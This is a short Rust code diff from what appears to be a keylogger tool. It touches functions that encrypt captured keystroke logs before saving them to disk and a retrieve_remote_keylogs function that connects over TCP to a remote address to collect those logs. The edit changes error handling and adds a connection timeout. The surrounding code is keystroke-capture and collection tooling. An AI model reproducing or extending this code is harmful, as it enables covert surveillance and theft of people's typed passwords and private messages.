@@ -90,7 +90,7 @@ fn save_string_to_queue(to_write: &String, string_queue: &mut String, encryption
     let string_queue_owned = pad(string_queue, LOG_LINE_LENGTH, '-', true);
     string_queue.clear();
     save_encrypted_to_disk(
-        encrypt_asym(&encrypt_sym(string_queue_owned.as_bytes(), &encryption_details.sym_key_loc),  &encryption_details.pub_key_loc));
+        encrypt_asym(&encrypt_sym(string_queue_owned.as_bytes(), &encryption_details.sym_key_loc), &encryption_details.pub_key_loc));
 }
 
 fn encrypt_sym(data_to_encrypt: &[u8], key_loc: &str) -> Vec<u8> {
@@ -321,10 +321,18 @@ pub fn load_key_logs(log_file_path: &str) -> Result<Vec<u8>, Box<std::error::Err
     Ok(contents)
 }
 
-pub fn retrieve_remote_keylogs(addr: &str, public_key: &[u8]) -> Vec<(String, Vec<u8>)> {
+pub fn retrieve_remote_keylogs(addr: &str, public_key: &[u8]) -> Result<Vec<(String, Vec<u8>)>, std::io::Error> {
     println!("{}", addr);
-    let mut stream = std::net::TcpStream::connect(addr).expect("Error connecting");
-
+    let stream = std::net::TcpStream::connect_timeout(&addr.parse().unwrap(), std::time::Duration::new(1, 0));
+    let mut stream = match stream {
+        Ok(res) => res,
+        Err(ref error) if error.kind() == std::io::ErrorKind::TimedOut => {
+            return Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Hello"));
+        },
+        Err(error) => {
+            panic!(error)
+        }
+    };
     stream.write(public_key).expect("Public key send failed");
 
     let mut data = Vec::new();
@@ -348,7 +356,7 @@ pub fn retrieve_remote_keylogs(addr: &str, public_key: &[u8]) -> Vec<(String, Ve
         let i = i * 2;
         output.push((std::str::from_utf8(true_content[i].as_ref()).unwrap().to_owned(), true_content[i + 1].clone()));
     }
-    output
+    Ok(output)
 }
 
 
